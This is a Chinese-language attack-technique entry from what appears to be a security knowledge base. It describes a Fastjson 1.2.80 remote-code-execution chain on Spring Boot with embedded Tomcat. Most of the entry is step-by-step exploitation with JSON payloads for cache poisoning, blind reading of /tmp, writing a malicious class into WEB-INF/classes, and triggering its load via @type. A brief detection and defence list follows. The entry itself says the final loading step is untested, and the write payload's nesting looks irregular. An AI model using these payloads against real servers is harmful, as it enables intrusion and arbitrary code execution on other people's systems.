---
id: web-java-deser-fastjson-1280-springboot-tomcat-webresources-class-load-rce
title: Fastjson 1.2.80 在 Spring Boot/Tomcat 部署下的写类→类加载 RCE：从 /tmp 枚举 docbase，写 WEB-INF/classes，再由 @type 经 TomcatEmbeddedWebappClassLoader 触发加载
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-1280-tomcat-webresources-classload-rce
aliases:
- fastjson 1.2.80 springboot 新链
- TomcatEmbeddedWebappClassLoader 加载恶意类
- WEB-INF/classes 写 class RCE
- WebappClassLoaderBase findClassInternal
- StandardRoot getClassLoaderResource
- Cache noCache WEB-INF classes
- fastjson 写文件到 RCE
tags:
- java
- fastjson
- deserialization
- springboot
- tomcat
- classloader
- file-write
- rce
- cve-2022-25845
cve:
- CVE-2022-25845
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: fastjson <= 1.2.80
verification:
  verified_by: verifier-T2-3W5
  verified_at: '2026-11-08T23:25:37+08:00'
  notes: 已对照原文核对；本次核对未读取图片；缓存投毒两段式 payload、BOMInputStream 逐字节盲读、TeeInputStream+LockableFileWriter 写文件、TomcatEmbeddedWebappClassLoader→WebappClassLoaderBase.findClassInternal→StandardRoot.getClassLoaderResource→Cache.getResource(noCache 对 WEB-INF/classes 的 .class 恒不缓存) 的调用链与原文逐段一致；未验证点：docbase 位于 /tmp 的具体形态、Evil.class 写入后能否被加载均依赖目标环境，原文仅给出思路，未实测
---

## 一句话结论

在 Spring Boot（内嵌 Tomcat、fat-jar 部署）里，fastjson 1.2.80 的两段式缓存链先拿到任意文件读与任意文件写，接下来不必去覆盖 `charsets.jar`、也不必要求 JDK8：用文件读从 `/tmp` 里枚举出内嵌 Tomcat 解包出来的临时 docbase 目录名，把恶意 `.class` 写到 `${docbase}/WEB-INF/classes/` 下，再发一个 `@type` 指向该类的 JSON——`TypeUtils.loadClass` 会经 `TomcatEmbeddedWebappClassLoader` → `WebappClassLoaderBase.findClass` → `StandardRoot.getClassLoaderResource` → `Cache.getResource` 找到刚写入的 class 并加载，静态初始化即执行代码。

## 原理

- **`@type` 不只是走 AutoType 白名单，最后一步是 `loadClass`**：`TypeUtils.loadClass(typeName, defaultClassLoader, cache)` 在缓存/黑白名单都没命中时，会调用 `Class.forName`/`loadClass` 让**当前线程上下文或 Web 应用的类加载器**去找这个类。内嵌 Tomcat 里这个类加载器是 `TomcatEmbeddedWebappClassLoader`（`WebappClassLoaderBase` 的子类）。
- **双亲委派之后还会查自己的 Web 资源**：`WebappClassLoaderBase.findClass` → `findClassInternal` 在父加载器找不到时，会去 `StandardRoot` 的 Web 资源里按 `/WEB-INF/classes/<name>.class` 的路径找；`StandardRoot.getClassLoaderResource` 继续调用 `Cache.getResource`。
- **`Cache.noCache` 反而保证了"新写的 class 一定被读到"**：`noCache(path)` 对 `.class` 且路径以 `/WEB-INF/classes/`（或 `/WEB-INF/lib/`）开头的资源返回 true，于是跳过缓存直接 `root.getResourceInternal(...)` 从磁盘取文件——攻击者刚写进去的 class 不会被旧缓存挡住，也不需要重启。
- **"写进去就能加载"是因为路径可预测**：只要知道 docbase 的绝对路径，`WEB-INF/classes` 就是固定子目录；Spring Boot 的 `TomcatEmbeddedWebappClassLoader` 在启动时会把 fat-jar 里的内容服务成 Web 资源（或用临时目录），所以 docbase 通常在 `/tmp/tomcat-docbase.*` 一类路径下。
- **找 docbase 的方法就是已拿到的文件读原语**：`jdk.nashorn.api.scripting.URLReader` 接受任意 URL，`file:` 协议可以读目录（`file:///tmp/` 的流里含目录项名），配合 commons-io 的 `BOMInputStream`/`XmlStreamReader` 逐字节盲读，就能把 `/tmp` 下的 `tomcat-docbase.xxx` 目录名读出来。这就是"为什么这条链不需要出网、也不需要已知绝对路径"。
- **为什么这是 RCE 而不是普通文件写**：写文件本身只是落盘，真正执行发生在 `@type` 触发类加载的那一刻——`<clinit>`/静态字段初始化即执行任意代码，不依赖 cron、不依赖重启、不依赖 JSP 编译。

## 触发条件

- fastjson ≤ 1.2.80，SafeMode 关闭，存在把不可信 JSON 交给 `JSON.parse`/`parseObject` 的入口。
- 应用为 Spring Boot + 内嵌 Tomcat（`TomcatEmbeddedWebappClassLoader` 存在），且以 fat-jar 方式运行（docbase 落在临时目录、`WEB-INF/classes` 可写）。
- classpath 里有 jackson-core 与 commons-io（前者提供 `InputCoercionException`/`JsonParser`/`UTF8StreamJsonParser` 做缓存投毒与 IO 原语，后者提供 `BOMInputStream`/`TeeInputStream`/`LockableFileWriter` 做读写）。
- 已通过缓存链拿到任意文件读（枚举 `/tmp`）与任意文件写（写 `.class`）两个原语。
- 目标进程对 docbase 有写权限（同用户即可，Spring Boot 默认如此）。

## 利用步骤

1. 投毒缓存并拿到 IO 原语：用 `java.lang.Exception` + `com.fasterxml.jackson.core.exc.InputCoercionException`（字段 `p` → `JsonParser`）把 `JsonParser` 塞进 `ParserConfig` 的 `deserializers`；再用 `JsonParser` + `UTF8StreamJsonParser`（构造参数含 `InputStream`）把 `InputStream` 拿进缓存。
2. 任意文件读：`InputStream` → `org.apache.commons.io.input.BOMInputStream` → `jdk.nashorn.api.scripting.URLReader(url="file:///tmp/")`，利用 `BOMInputStream.getBOM/find` 的逐字节比较行为做盲读，把 `/tmp` 下的 `tomcat-docbase.*` 目录名读出。
3. 任意文件写：`TeeInputStream(input=CharSequenceInputStream(cs=恶意class字节的 latin-1 字符串), branch=WriterOutputStream(LockableFileWriter(file="${docbase}/WEB-INF/classes/Evil.class")))`，`read()` 时把内容同步写进目标文件（该写法避开 BlackHat 原链 8192 字节缓冲限制）。
4. 触发加载：发 `{"@type":"Evil"}`（或任何能命中 `TypeUtils.loadClass` 的类型名），让 `TomcatEmbeddedWebappClassLoader` 从 `WEB-INF/classes/Evil.class` 读入并 defineClass，`<clinit>` 执行。
5. 验证：命令写文件/回连；若加载失败，检查 docbase 是否正确、class 是否落在 `WEB-INF/classes` 根（包名要与路径一致）、`@type` 是否被 AutoType 拦在 `loadClass` 之前。

## PoC

第一段（缓存 `JsonParser`，与 1.2.80 缓存链一致）：

```json
{
  "a": "{ \"@type\": \"java.lang.Exception\", \"@type\": \"com.fasterxml.jackson.core.exc.InputCoercionException\", \"p\": {} }",
  "b": { "$ref": "$.a.a" },
  "c": "{ \"@type\": \"com.fasterxml.jackson.core.JsonParser\", \"@type\": \"com.fasterxml.jackson.core.json.UTF8StreamJsonParser\", \"in\": {} }",
  "d": { "$ref": "$.c.c" }
}
```

读目录（拿到 `InputStream` 后包 `URLReader`，`file:` 协议可列目录）：

```json
{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.BOMInputStream",
 "delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream",
   "reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"file:///tmp/"},
   "charsetName":"UTF-8","bufferSize":"1024"},
 "boms":[{"charsetName":"UTF-8","bytes":[1]}]}
```

写 class（`${docbase}` 与 `${size}` 按上一步读到的路径/字节数替换）：

```json
{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.AutoCloseInputStream",
 "in":{"@type":"org.apache.commons.io.input.TeeInputStream",
   "input":{"@type":"org.apache.commons.io.input.CharSequenceInputStream",
     "cs":{"@type":"java.lang.String","${shellcode}":"","charset":"iso-8859-1","bufferSize":"${size}"},
     "branch":{"@type":"org.apache.commons.io.output.WriterOutputStream",
       "writer":{"@type":"org.apache.commons.io.output.LockableFileWriter",
         "file":"${docbase}/WEB-INF/classes/Evil.class","charset":"iso-8859-1","append":true},
       "charset":"iso-8859-1","bufferSize":"1024","writeImmediately":true},
     "closeBranch":true}}}
```

触发加载：

```json
{"@type":"Evil"}
```

说明：class 字节需以 latin-1 单字节映射成字符串（每个 0x00–0xFF 对应一个同码位字符），否则写出的 class 会被 UTF-8 编码破坏；`WEB-INF/classes` 下的类名要与包结构一致，无包名时直接 `Evil`。

## 变体与关联

- 加载器路径可以换：`StandardRoot.getClassLoaderResource` / `Cache.getResource` 这条链同样适用于外部 Tomcat 的 `WEB-INF/classes`、`WEB-INF/lib/*.jar`（`noCache` 对 `/WEB-INF/lib/` 与 `.jar` 也返回 true）。
- 不必写 class：若目标 classpath 里已有可用的 gadget，也可把恶意内容写成 `WEB-INF/classes/META-INF/services/...` 之类由 SPI 消费的文件，再借某个 `@type` 触发的 ServiceLoader 加载。
- 路径来源可以换：`/tmp` 之外，读 `java.io.tmpdir`、`/proc/self/environ`、`/proc/self/cmdline` 也能推出 docbase；Spring Boot 2.x 的部分版本 docbase 固定在 `java.io.tmpdir/tomcat-docbase.<port>.<随机>`。
- 关联：[[web-java-deser-fastjson-1280-exception-deserializer-cache-bypass]]（本链前半段的缓存投毒与 IO 读写原语）、[[web-java-deser-fastjson-1280-outputstream-cache-file-write]]（同机制下的另类写文件 gadget）、[[web-java-deser-fastjson-file-protocol-no-egress-rce]]（`file:` 资源探测 + `LaunchedURLClassLoader` 的另一种类加载落地）、[[web-java-deser-fastjson-file-write-to-rce]]（写文件落地点的整体取舍）。

## 检测与防御

- 升级 fastjson 至修复版本，或开启 SafeMode；不要只依赖关闭 AutoType。
- 检测：请求中出现两段式 `java.lang.Exception` + `InputCoercionException` 组合；随后出现 `UTF8StreamJsonParser`、`BOMInputStream`、`TeeInputStream`、`CharSequenceInputStream`、`LockableFileWriter`、`jdk.nashorn.api.scripting.URLReader`、`file:///tmp` 等类名/路径；应用进程在 docbase 的 `WEB-INF/classes` 下新增 `.class` 文件。
- 检测：运行期出现不在启动时白名单内的类被 `WebappClassLoader` 加载（可 hook `findClass`/`defineClass` 记录类名与来源 jar/目录）。
- 防御：fat-jar 运行时把 docbase 挂到只读文件系统；`WEB-INF/classes` 目录对进程只读；关闭 `TypeUtils.loadClass` 的不可信输入来源（即不把用户 JSON 交给 fastjson）；classpath 收敛，移除不必要的 jackson-core/commons-io。
